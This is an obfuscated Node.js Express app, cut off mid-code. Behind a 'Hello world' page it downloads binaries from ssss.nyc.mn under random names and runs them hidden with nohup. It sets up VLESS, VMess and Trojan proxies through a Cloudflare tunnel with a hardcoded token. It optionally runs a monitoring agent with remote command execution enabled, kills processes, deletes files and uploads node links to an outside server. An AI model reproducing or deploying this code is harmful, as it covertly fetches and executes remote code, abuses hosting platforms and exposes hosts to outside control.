const _0x136757=_0x2509;(function(_0x294a09,_0x251f9a){const _0x1ecc5b={_0x28798d:0x1ce,_0x48f34c:0x235,_0x48dbe8:0x1d2,_0x225344:0x1e0,_0x9c2d13:0x23b},_0x38d4c6=_0x2509,_0x4746ab=_0x294a09();while(!![]){try{const _0x4e8fd3=-parseInt(_0x38d4c6(_0x1ecc5b._0x28798d))/0x1+parseInt(_0x38d4c6(0x1de))/0x2*(parseInt(_0x38d4c6(0x239))/0x3)+parseInt(_0x38d4c6(0x210))/0x4+-parseInt(_0x38d4c6(_0x1ecc5b._0x48f34c))/0x5*(-parseInt(_0x38d4c6(_0x1ecc5b._0x48dbe8))/0x6)+parseInt(_0x38d4c6(0x21e))/0x7*(parseInt(_0x38d4c6(_0x1ecc5b._0x225344))/0x8)+parseInt(_0x38d4c6(_0x1ecc5b._0x9c2d13))/0x9+-parseInt(_0x38d4c6(0x245))/0xa;if(_0x4e8fd3===_0x251f9a)break;else _0x4746ab['push'](_0x4746ab['shift']());}catch(_0x260075){_0x4746ab['push'](_0x4746ab['shift']());}}}(_0xdaab,0xc4c41));const express=require(_0x136757(0x20c)),app=express(),axios=require(_0x136757(0x250)),os=require('os'),fs=require('fs'),path=require(_0x136757(0x1ef)),{promisify}=require(_0x136757(0x1b3)),exec=promisify(require(_0x136757(0x1b1))['exec']),UPLOAD_URL=process[_0x136757(0x1ea)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x136757(0x1ea)][_0x136757(0x1f9)]||'',AUTO_ACCESS=process[_0x136757(0x1ea)][_0x136757(0x23f)]||![],FILE_PATH=process['env'][_0x136757(0x191)]||'.tmp',SUB_PATH=process[_0x136757(0x1ea)][_0x136757(0x203)]||'sub',PORT=process[_0x136757(0x1ea)][_0x136757(0x19e)]||process[_0x136757(0x1ea)][_0x136757(0x1e4)]||0xbb8,UUID=process[_0x136757(0x1ea)][_0x136757(0x21c)]||_0x136757(0x1ec),NEZHA_SERVER=process[_0x136757(0x1ea)][_0x136757(0x24b)]||'',NEZHA_PORT=process['env'][_0x136757(0x24d)]||'',NEZHA_KEY=process[_0x136757(0x1ea)][_0x136757(0x231)]||'',ARGO_DOMAIN=process[_0x136757(0x1ea)][_0x136757(0x232)]||'data.rongming.eu.cc',ARGO_AUTH=process[_0x136757(0x1ea)][_0x136757(0x247)]||_0x136757(0x1a4),ARGO_PORT=process[_0x136757(0x1ea)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x136757(0x244)]||_0x136757(0x1fa),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x136757(0x1ea)][_0x136757(0x1f6)]||_0x136757(0x228);!fs['existsSync'](FILE_PATH)?(fs[_0x136757(0x1cf)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x136757(0x217)](FILE_PATH+_0x136757(0x194));function generateRandomName(){const _0x51d569={_0x55caf0:0x226},_0x144405=_0x136757,_0x5e3f7d='abcdefghijklmnopqrstuvwxyz';let _0x1e561c='';for(let _0x5b2a3c=0x0;_0x5b2a3c<0x6;_0x5b2a3c++){_0x1e561c+=_0x5e3f7d[_0x144405(0x1ad)](Math['floor'](Math[_0x144405(_0x51d569._0x55caf0)]()*_0x5e3f7d[_0x144405(0x1ee)]));}return _0x1e561c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x136757(0x1fb)](FILE_PATH,npmName),phpPath=path[_0x136757(0x1fb)](FILE_PATH,phpName),webPath=path[_0x136757(0x1fb)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x136757(0x1fb)](FILE_PATH,'sub.txt'),listPath=path[_0x136757(0x1fb)](FILE_PATH,_0x136757(0x1f4)),bootLogPath=path['join'](FILE_PATH,_0x136757(0x1b4)),configPath=path[_0x136757(0x1fb)](FILE_PATH,'config.json');function _0xdaab(){const _0x4c6faf=['Skipping\x20adding\x20automatic\x20access\x20task','9415096CUjdpo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createWriteStream','PORT','message','del\x20/f\x20/q\x20','2096','chmod','firefox','env','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','23606779-173b-452e-8be7-6fcfcb76c0da','/vmess-argo?ed=2560','length','path','block','catch','base64','status','list.txt','trojan','NAME','TunnelSecret','country_code','PROJECT_URL','saas.sin.fan','join','isp','aarch64','application/json','8443','blackhole','toString','/api/add-subscriptions','SUB_PATH','stringify','get','\x0a\x0avmess://','\x0a\x20\x20\x20\x20','readFileSync','\x0avless://','https://arm64.ssss.nyc.mn/bot','promises','express','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','auto','Mozilla/5.0','4844788grfpBs','&path=%2Ftrojan-argo%3Fed%3D2560#','Add\x20automatic\x20access\x20task\x20faild:\x20','Subscription\x20uploaded\x20successfully','Empowerment\x20failed\x20for\x20','has','utf8','log','send','tcp','NEZHA\x20variable\x20is\x20empty,skip\x20running','split','UUID','taskkill\x20/f\x20/im\x20','7Oiqrpw','ArgoDomain:','\x20>/dev/null\x202>&1','\x20-c\x20\x22','\x20-s\x20','basename','forEach','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','random','config.json','northflank','?security=tls&sni=','/api/add-nodes','127.0.0.1','post','\x20is\x20running','from','Unhandled\x20error\x20in\x20startserver:','/tunnel.yml\x20run','NEZHA_KEY','ARGO_DOMAIN','Download\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','1920okOmnO','https://arm64.ssss.nyc.mn/agent','vmess','https://amd64.ssss.nyc.mn/bot','3807GQsImX','443','6853950ttjaBq','\x0a\x20\x20tunnel:\x20','text/plain;\x20charset=utf-8','rm\x20-rf\x20','AUTO_ACCESS','https://arm64.ssss.nyc.mn/v1','clear','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','vless','CFIP','26926510AzsRkU','tls','ARGO_AUTH','/vless-argo','existsSync','data','NEZHA_SERVER','index.html','NEZHA_PORT','success','writeFileSync','axios','FILE_PATH','tunnel.yml','filter','\x20already\x20exists','map','true','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/web','automatic\x20access\x20task\x20added\x20successfully','push','/vmess-argo','nohup\x20','\x22\x20>\x20/dev/null\x202>&1','SERVER_PORT','\x20-c\x20','\x0a\x20\x20credentials-file:\x20','/dev/null','npm\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','eyJhIjoiOTM5MmZhYTljY2JkZGI3MjRmNjQxZjAzMzM4NTgwNzMiLCJ0IjoiODcxNzljZjEtNDk5Ni00OWJlLWE1NWItZGI0YWNjMTc1ZjdjIiwicyI6Ik5UWXlaV1poWWpFdFpUTmlaaTAwTlRRMUxXSTNZalV0TVRJeFl6WmhNelZrWmpabCJ9','\x20>\x20nul\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','replace','none','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http','set','utf-8','charAt','includes','unlinkSync','2083','child_process','\x20-p\x20','util','boot.log','platform','test','https://api.ip.sb/geoip','error','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20failed:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','--tls','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&fp=firefox&type=ws&host=','\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','stream','match','quic','Error\x20executing\x20command:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2053','&path=%2Fvless-argo%3Fed%3D2560#','pop','fileUrl','2087','amd','http://ip-api.com/json','web\x20running\x20error:\x20','126467LRNSqx','mkdirSync','.exe\x20>\x20nul\x202>&1','tunnel.json','3126usfsgx','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','fileName','org','countryCode','win32','Content-Type','App\x20is\x20running','arm','pkill\x20-f\x20\x22[','response','Nodes\x20uploaded\x20successfully','434AeLnTp'];_0xdaab=function(){return _0x4c6faf;};return _0xdaab();}function deleteNodes(){const _0x2d71e2={_0x1f9e98:0x22e,_0x181457:0x1f2,_0x4deb4c:0x201,_0x28339e:0x22c,_0x37dd18:0x1fe},_0x35d6af=_0x136757;try{if(!UPLOAD_URL)return;if(!fs[_0x35d6af(0x249)](subPath))return;let _0x5338c7;try{_0x5338c7=fs['readFileSync'](subPath,_0x35d6af(0x1ac));}catch{return null;}const _0x1eef74=Buffer[_0x35d6af(_0x2d71e2._0x1f9e98)](_0x5338c7,_0x35d6af(_0x2d71e2._0x181457))[_0x35d6af(_0x2d71e2._0x4deb4c)]('utf-8'),_0x88be06=_0x1eef74[_0x35d6af(0x21b)]('\x0a')[_0x35d6af(0x193)](_0x4f33f4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4f33f4));if(_0x88be06[_0x35d6af(0x1ee)]===0x0)return;return axios[_0x35d6af(_0x2d71e2._0x28339e)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x35d6af(0x204)]({'nodes':_0x88be06}),{'headers':{'Content-Type':_0x35d6af(_0x2d71e2._0x37dd18)}})[_0x35d6af(0x1f1)](_0x1fafdf=>{return null;}),null;}catch(_0x57bd91){return null;}}function cleanupOldFiles(){const _0x51dc79={_0x58aaff:0x1af},_0x207835=_0x136757;try{const _0x148631=fs['readdirSync'](FILE_PATH);_0x148631[_0x207835(0x224)](_0x1eb511=>{const _0x33e8fd=_0x207835,_0x465626=path['join'](FILE_PATH,_0x1eb511);try{const _0xd9b652=fs['statSync'](_0x465626);_0xd9b652['isFile']()&&fs[_0x33e8fd(_0x51dc79._0x58aaff)](_0x465626);}catch(_0x4a0f1d){}});}catch(_0x4b6a5f){}}async function generateConfig(){const _0xacef7f={_0x518154:0x219,_0x3484da:0x1a8,_0x1e0fc7:0x243,_0x1b18ec:0x246,_0x16a530:0x19b,_0x271ed5:0x246,_0x486fe7:0x1c3,_0x45f1e2:0x1a8,_0x1d464f:0x1f0},_0x263ed8=_0x136757,_0x3290a3={'log':{'access':_0x263ed8(0x1a1),'error':_0x263ed8(0x1a1),'loglevel':_0x263ed8(0x1a8)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x263ed8(0x19b),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x263ed8(_0xacef7f._0x518154)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x263ed8(_0xacef7f._0x3484da)},'streamSettings':{'network':_0x263ed8(0x219),'security':_0x263ed8(_0xacef7f._0x3484da)}},{'port':0xbba,'listen':_0x263ed8(0x22b),'protocol':_0x263ed8(_0xacef7f._0x1e0fc7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x263ed8(0x1a8)},'streamSettings':{'network':'ws','security':_0x263ed8(_0xacef7f._0x3484da),'wsSettings':{'path':_0x263ed8(0x248)}},'sniffing':{'enabled':!![],'destOverride':[_0x263ed8(0x1aa),_0x263ed8(_0xacef7f._0x1b18ec),_0x263ed8(0x1c3)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x263ed8(0x237),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x263ed8(_0xacef7f._0x16a530)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x263ed8(_0xacef7f._0x271ed5),_0x263ed8(_0xacef7f._0x486fe7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x263ed8(0x22b),'protocol':_0x263ed8(0x1f5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x263ed8(_0xacef7f._0x45f1e2),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x263ed8(0x246),_0x263ed8(_0xacef7f._0x486fe7)],'metadataOnly':![]}}],'dns':{'servers':[_0x263ed8(0x197)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x263ed8(0x200),'tag':_0x263ed8(_0xacef7f._0x1d464f)}]};fs[_0x263ed8(0x24f)](path['join'](FILE_PATH,_0x263ed8(0x227)),JSON[_0x263ed8(0x204)](_0x3290a3,null,0x2));}function getSystemArchitecture(){const _0x113777={_0x2c65fe:0x1da,_0x5afca9:0x1fd},_0x1836f7=_0x136757,_0xb57a2b=os['arch']();return _0xb57a2b===_0x1836f7(_0x113777._0x2c65fe)||_0xb57a2b==='arm64'||_0xb57a2b===_0x1836f7(_0x113777._0x5afca9)?_0x1836f7(0x1da):_0x1836f7(0x1cb);}function downloadFile(_0x1f7bb5,_0x53dee3,_0x27cd27){const _0x119bf0={_0x4afdb2:0x1c1},_0x1b860c={_0x52193a:0x1ba,_0x1d2a52:0x1b8},_0x4d755c={_0x2befaf:0x24a},_0x4e4c6a=_0x136757,_0x281047=_0x1f7bb5;!fs[_0x4e4c6a(0x249)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x101b4c=fs[_0x4e4c6a(0x1e3)](_0x281047);axios({'method':'get','url':_0x53dee3,'responseType':_0x4e4c6a(_0x119bf0._0x4afdb2)})['then'](_0x5f4d0c=>{const _0x6cf8af={_0x4ef7bd:0x223},_0x42420b={_0x49b8b3:0x217},_0x2c6806=_0x4e4c6a;_0x5f4d0c[_0x2c6806(_0x4d755c._0x2befaf)]['pipe'](_0x101b4c),_0x101b4c['on']('finish',()=>{const _0x3310bd=_0x2c6806;_0x101b4c['close'](),console[_0x3310bd(_0x42420b._0x49b8b3)](_0x3310bd(0x233)+path['basename'](_0x281047)+'\x20successfully'),_0x27cd27(null,_0x281047);}),_0x101b4c['on'](_0x2c6806(0x1b8),_0x523829=>{const _0x4fa2c0=_0x2c6806;fs['unlink'](_0x281047,()=>{});const _0x4f19ed=_0x4fa2c0(0x233)+path[_0x4fa2c0(_0x6cf8af._0x4ef7bd)](_0x281047)+_0x4fa2c0(0x1ba)+_0x523829[_0x4fa2c0(0x1e5)];console['error'](_0x4f19ed),_0x27cd27(_0x4f19ed);});})[_0x4e4c6a(0x1f1)](_0x228e0a=>{const _0x4b5c11=_0x4e4c6a,_0x2f4a08='Download\x20'+path['basename'](_0x281047)+_0x4b5c11(_0x1b860c._0x52193a)+_0x228e0a[_0x4b5c11(0x1e5)];console[_0x4b5c11(_0x1b860c._0x1d2a52)](_0x2f4a08),_0x27cd27(_0x2f4a08);});}async function downloadFilesAndRun(){const _0x2dba43={_0x20afed:0x195,_0x3adcdc:0x1b8,_0x3495a6:0x21b,_0x5e6fd1:0x1c8,_0x533794:0x1ff,_0x1a7179:0x1b0,_0x5c9e31:0x196,_0x3c34ff:0x1ca,_0x19c67e:0x1ae,_0x33e3ea:0x1bc,_0x3c90c8:0x222,_0x1a1b9f:0x1b2,_0x56cbd2:0x217,_0x336963:0x22d,_0x42dd01:0x1a2,_0xc810b5:0x217,_0x4c3b3e:0x19f,_0x52f6f0:0x217,_0x91217a:0x249,_0x29bc79:0x1a9,_0x5aa0f3:0x1c2,_0x23cefd:0x230,_0x47f0ee:0x20d},_0x1d04a0={_0x417dbd:0x249},_0x27be16=_0x136757,_0x41b878=getSystemArchitecture(),_0x469a60=getFilesForArchitecture(_0x41b878);if(_0x469a60[_0x27be16(0x1ee)]===0x0){console[_0x27be16(0x217)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5c4ed7=_0x469a60[_0x27be16(_0x2dba43._0x20afed)](_0x353359=>{const _0x21095f={_0x1997dd:0x1d4,_0x3d5627:0x1c9};return new Promise((_0x43eb8c,_0x500c29)=>{const _0x45c6cf=_0x2509;downloadFile(_0x353359[_0x45c6cf(_0x21095f._0x1997dd)],_0x353359[_0x45c6cf(_0x21095f._0x3d5627)],(_0x754f77,_0x13bcb8)=>{_0x754f77?_0x500c29(_0x754f77):_0x43eb8c(_0x13bcb8);});});});try{await Promise['all'](_0x5c4ed7);}catch(_0x3cf3b7){console[_0x27be16(_0x2dba43._0x3adcdc)]('Error\x20downloading\x20files:',_0x3cf3b7);return;}function _0x3dbf95(_0x3868ce){const _0x1f7886=_0x27be16,_0x408bd1=0x1fd;_0x3868ce[_0x1f7886(0x224)](_0x378b68=>{const _0x53ec24=_0x1f7886;fs[_0x53ec24(_0x1d04a0._0x417dbd)](_0x378b68)&&fs[_0x53ec24(0x1e8)](_0x378b68,_0x408bd1,_0x3d1c0c=>{const _0x18649f=_0x53ec24;_0x3d1c0c?console['error'](_0x18649f(0x214)+_0x378b68+':\x20'+_0x3d1c0c):console['log']('Empowerment\x20success\x20for\x20'+_0x378b68+':\x20'+_0x408bd1['toString'](0x8));});});}const _0x2e2ce3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3dbf95(_0x2e2ce3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f0007=NEZHA_SERVER[_0x27be16(0x1ae)](':')?NEZHA_SERVER[_0x27be16(_0x2dba43._0x3495a6)](':')[_0x27be16(_0x2dba43._0x5e6fd1)]():'',_0x53ac09=new Set([_0x27be16(0x23a),_0x27be16(_0x2dba43._0x533794),_0x27be16(0x1e7),_0x27be16(0x1ca),_0x27be16(_0x2dba43._0x1a7179),_0x27be16(0x1c6)]),_0x5a570b=_0x53ac09[_0x27be16(0x215)](_0x1f0007)?_0x27be16(_0x2dba43._0x5c9e31):'false',_0x16950c='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x27be16(0x1b9)+_0x5a570b+_0x27be16(0x1e2)+UUID;fs[_0x27be16(0x24f)](path[_0x27be16(0x1fb)](FILE_PATH,'config.yaml'),_0x16950c);const _0x35d28c=_0x27be16(0x19c)+phpPath+_0x27be16(0x221)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x35d28c),console[_0x27be16(0x217)](phpName+_0x27be16(0x22d)),await new Promise(_0x2bba82=>setTimeout(_0x2bba82,0x3e8));}catch(_0x5c8bee){console[_0x27be16(0x1b8)]('php\x20running\x20error:\x20'+_0x5c8bee);}}else{let _0x266b96='';const _0x5a06ce=[_0x27be16(0x23a),_0x27be16(0x1ff),_0x27be16(0x1e7),_0x27be16(_0x2dba43._0x3c34ff),_0x27be16(0x1b0),_0x27be16(0x1c6)];_0x5a06ce[_0x27be16(_0x2dba43._0x19c67e)](NEZHA_PORT)&&(_0x266b96=_0x27be16(_0x2dba43._0x33e3ea));const _0x3c66bc=_0x27be16(0x19c)+npmPath+_0x27be16(_0x2dba43._0x3c90c8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x27be16(_0x2dba43._0x1a1b9f)+NEZHA_KEY+'\x20'+_0x266b96+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3c66bc),console[_0x27be16(_0x2dba43._0x56cbd2)](npmName+_0x27be16(_0x2dba43._0x336963)),await new Promise(_0xaed9f0=>setTimeout(_0xaed9f0,0x3e8));}catch(_0x1bfb37){console[_0x27be16(0x1b8)](_0x27be16(_0x2dba43._0x42dd01)+_0x1bfb37);}}}else console[_0x27be16(_0x2dba43._0xc810b5)](_0x27be16(0x21a));const _0x2a6860=_0x27be16(0x19c)+webPath+_0x27be16(_0x2dba43._0x4c3b3e)+FILE_PATH+_0x27be16(0x1a3);try{await exec(_0x2a6860),console[_0x27be16(_0x2dba43._0x52f6f0)](webName+'\x20is\x20running'),await new Promise(_0x5c0288=>setTimeout(_0x5c0288,0x3e8));}catch(_0x363ab8){console['error'](_0x27be16(0x1cd)+_0x363ab8);}if(fs[_0x27be16(_0x2dba43._0x91217a)](botPath)){let _0x250d4c;if(ARGO_AUTH[_0x27be16(0x1c2)](/^[A-Z0-9a-z=]{120,250}$/))_0x250d4c=_0x27be16(_0x2dba43._0x29bc79)+ARGO_AUTH;else ARGO_AUTH[_0x27be16(_0x2dba43._0x5aa0f3)](/TunnelSecret/)?_0x250d4c=_0x27be16(0x1bd)+FILE_PATH+_0x27be16(_0x2dba43._0x23cefd):_0x250d4c=_0x27be16(_0x2dba43._0x47f0ee)+FILE_PATH+_0x27be16(0x242)+ARGO_PORT;try{await exec(_0x27be16(0x19c)+botPath+'\x20'+_0x250d4c+_0x27be16(0x1bf)),console[_0x27be16(0x217)](botName+'\x20is\x20running'),await new Promise(_0x594069=>setTimeout(_0x594069,0x7d0));}catch(_0x429610){console['error'](_0x27be16(0x1c4)+_0x429610);}}await new Promise(_0x113d3e=>setTimeout(_0x113d3e,0x1388));}function _0x2509(_0x3679bc,_0x4620f1){const _0xdaab67=_0xdaab();return _0x2509=function(_0x25094c,_0x40af33){_0x25094c=_0x25094c-0x191;let _0xc39909=_0xdaab67[_0x25094c];return _0xc39909;},_0x2509(_0x3679bc,_0x4620f1);}function getFilesForArchitecture(_0x4f2a56){const _0x14fcc5={_0x1e2776:0x20a,_0x10376a:0x240},_0x48ec5c=_0x136757;let _0x35bf1b;_0x4f2a56==='arm'?_0x35bf1b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x48ec5c(_0x14fcc5._0x1e2776)}]:_0x35bf1b=[{'fileName':webPath,'fileUrl':_0x48ec5c(0x198)},{'fileName':botPath,'fileUrl':_0x48ec5c(0x238)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1e4137=_0x4f2a56==='arm'?_0x48ec5c(0x236):'https://amd64.ssss.nyc.mn/agent';_0x35bf1b['unshift']({'fileName':npmPath,'fileUrl':_0x1e4137});}else{const _0x533d7a=_0x4f2a56===_0x48ec5c(0x1da)?_0x48ec5c(_0x14fcc5._0x10376a):'https://amd64.ssss.nyc.mn/v1';_0x35bf1b['unshift']({'fileName':phpPath,'fileUrl':_0x533d7a});}}return _0x35bf1b;}function argoType(){const _0x353b0a={_0x4c0446:0x217,_0x22bca6:0x1ae,_0x223ef2:0x1a0,_0x5394c9:0x225,_0x29c298:0x1c5,_0x26c309:0x1fb,_0x9f1dbb:0x192},_0x2e1863=_0x136757;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2e1863(_0x353b0a._0x4c0446)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2e1863(_0x353b0a._0x22bca6)](_0x2e1863(0x1f7))){fs[_0x2e1863(0x24f)](path['join'](FILE_PATH,_0x2e1863(0x1d1)),ARGO_AUTH);const _0x5a72b5=_0x2e1863(0x23c)+ARGO_AUTH[_0x2e1863(0x21b)]('\x22')[0xb]+_0x2e1863(_0x353b0a._0x223ef2)+path[_0x2e1863(0x1fb)](FILE_PATH,_0x2e1863(0x1d1))+_0x2e1863(0x1e1)+ARGO_DOMAIN+_0x2e1863(_0x353b0a._0x5394c9)+ARGO_PORT+_0x2e1863(_0x353b0a._0x29c298);fs[_0x2e1863(0x24f)](path[_0x2e1863(_0x353b0a._0x26c309)](FILE_PATH,_0x2e1863(_0x353b0a._0x9f1dbb)),_0x5a72b5);}else console[_0x2e1863(0x217)](_0x2e1863(0x234));}async function extractDomains(){const _0x470d35={_0x1cf2a9:0x208,_0x5d12e6:0x1fb,_0x3e5a8f:0x1ac,_0x26f7a8:0x21f,_0x3f338d:0x217,_0x186470:0x1bb,_0x42ab6d:0x1af,_0x98fc2f:0x1b4,_0x4ea851:0x20d,_0x124481:0x242,_0x33a1a9:0x19c,_0x8abf8c:0x1bf},_0x18e406={_0x348297:0x205,_0x2e5fdf:0x1b7,_0x1add62:0x1f8,_0x36fe22:0x1a7,_0x18f578:0x205,_0x354223:0x24a,_0x3b5818:0x24e,_0x5502da:0x24a,_0x329b93:0x24a},_0x5e27e5={_0x11fa66:0x1d0,_0x222d12:0x1ad},_0x5b8760=_0x136757;let _0x1f3ed5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1f3ed5=ARGO_DOMAIN,console[_0x5b8760(0x217)]('ARGO_DOMAIN:',_0x1f3ed5),await _0x3772aa(_0x1f3ed5);else try{const _0x1594db=fs[_0x5b8760(_0x470d35._0x1cf2a9)](path[_0x5b8760(_0x470d35._0x5d12e6)](FILE_PATH,'boot.log'),_0x5b8760(_0x470d35._0x3e5a8f)),_0x2c2e58=_0x1594db[_0x5b8760(0x21b)]('\x0a'),_0x1497f9=[];_0x2c2e58[_0x5b8760(0x224)](_0x30c23b=>{const _0x35d7f7=_0x5b8760,_0x4a79be=_0x30c23b[_0x35d7f7(0x1c2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4a79be){const _0x31d439=_0x4a79be[0x1];_0x1497f9['push'](_0x31d439);}});if(_0x1497f9[_0x5b8760(0x1ee)]>0x0)_0x1f3ed5=_0x1497f9[0x0],console['log'](_0x5b8760(_0x470d35._0x26f7a8),_0x1f3ed5),await _0x3772aa(_0x1f3ed5);else{console[_0x5b8760(_0x470d35._0x3f338d)](_0x5b8760(_0x470d35._0x186470)),fs[_0x5b8760(_0x470d35._0x42ab6d)](path[_0x5b8760(0x1fb)](FILE_PATH,_0x5b8760(_0x470d35._0x98fc2f)));async function _0x4341f0(){const _0x37633b=_0x5b8760;try{process[_0x37633b(0x1b5)]==='win32'?await exec(_0x37633b(0x21d)+botName+_0x37633b(_0x5e27e5._0x11fa66)):await exec(_0x37633b(0x1db)+botName[_0x37633b(_0x5e27e5._0x222d12)](0x0)+']'+botName['substring'](0x1)+_0x37633b(0x19d));}catch(_0x3de37b){}}_0x4341f0(),await new Promise(_0x562688=>setTimeout(_0x562688,0xbb8));const _0x3825bd=_0x5b8760(_0x470d35._0x4ea851)+FILE_PATH+_0x5b8760(_0x470d35._0x124481)+ARGO_PORT;try{await exec(_0x5b8760(_0x470d35._0x33a1a9)+botPath+'\x20'+_0x3825bd+_0x5b8760(_0x470d35._0x8abf8c)),console[_0x5b8760(_0x470d35._0x3f338d)](botName+'\x20is\x20running'),await new Promise(_0x473ba8=>setTimeout(_0x473ba8,0xbb8)),await extractDomains();}catch(_0x4c8d3d){console[_0x5b8760(0x1b8)]('Error\x20executing\x20command:\x20'+_0x4c8d3d);}}}catch(_0x4b876e){console['error']('Error\x20reading\x20boot.log:',_0x4b876e);}async function _0xd6dca9(){const _0x394831=_0x5b8760;try{const _0x43c6e9=await axios[_0x394831(_0x18e406._0x348297)](_0x394831(_0x18e406._0x2e5fdf),{'headers':{'User-Agent':_0x394831(0x20f),'timeout':0xbb8}});if(_0x43c6e9[_0x394831(0x24a)]&&_0x43c6e9['data'][_0x394831(_0x18e406._0x1add62)]&&_0x43c6e9[_0x394831(0x24a)]['isp'])return(_0x43c6e9['data'][_0x394831(0x1f8)]+'-'+_0x43c6e9[_0x394831(0x24a)][_0x394831(0x1fc)])[_0x394831(_0x18e406._0x36fe22)](/\s+/g,'_');}catch(_0x109823){try{const _0x90bd16=await axios[_0x394831(_0x18e406._0x18f578)](_0x394831(0x1cc),{'headers':{'User-Agent':_0x394831(0x20f),'timeout':0xbb8}});if(_0x90bd16['data']&&_0x90bd16[_0x394831(_0x18e406._0x354223)][_0x394831(0x1f3)]===_0x394831(_0x18e406._0x3b5818)&&_0x90bd16[_0x394831(_0x18e406._0x5502da)][_0x394831(0x1d6)]&&_0x90bd16['data']['org'])return(_0x90bd16[_0x394831(_0x18e406._0x329b93)]['countryCode']+'-'+_0x90bd16[_0x394831(0x24a)][_0x394831(0x1d5)])[_0x394831(_0x18e406._0x36fe22)](/\s+/g,'_');}catch(_0x4e04ec){}}return'Unknown';}async function _0x3772aa(_0x41f492){const _0x4bf717={_0x3f250a:0x1ed,_0x26cf49:0x1e9,_0x235d28:0x209,_0x4e463b:0x22e,_0x492abb:0x201,_0x349168:0x1f2,_0x44b437:0x229,_0x526247:0x1be,_0x1f1a82:0x211,_0x402e27:0x207,_0x2057ab:0x217},_0x4a47a7=await _0xd6dca9(),_0x12f609=NAME?NAME+'-'+_0x4a47a7:_0x4a47a7;return new Promise(_0x2684f7=>{const _0x1c50ab={_0x10bc2a:0x1ab,_0x5a08cf:0x1d8};setTimeout(()=>{const 